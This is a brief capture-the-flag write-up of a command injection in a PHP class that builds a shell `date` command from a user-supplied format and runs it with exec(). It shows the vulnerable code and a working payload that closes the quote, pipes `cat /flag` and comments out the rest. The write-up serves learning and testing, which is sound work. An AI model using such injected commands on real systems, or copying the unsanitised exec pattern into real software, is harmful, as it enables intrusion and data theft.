php injection.

`http://94.237.54.30:58428/?format=%27,%20system(%22ls%22),%20%27`

The vulnerable code snippet:

```
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```

I had to do the following:
- close the single quote character that the date command opens
- then get my payload to execute without errors
- make it ignore the suffix that is always added after my payload

`%a' | cat /flag #`
With `%a'` the command becomes a valid one (`date '+%a'`).
Then I pipe my command (`| cat /flag`)
Finally I use `#` to make it ignore the suffix

How did I know the flag was at `/flag`? Because of the following line in the Dockerfile:
`COPY flag /flag`

(I suppose one could pipe `find` or something to search for it)
(I used Postman btw, as adding to the URL was a torture)

![image](https://github.com/ups-mega-hard/writeups/assets/162111822/921f2d45-2303-4c7c-a2c8-a285f51c1d92)
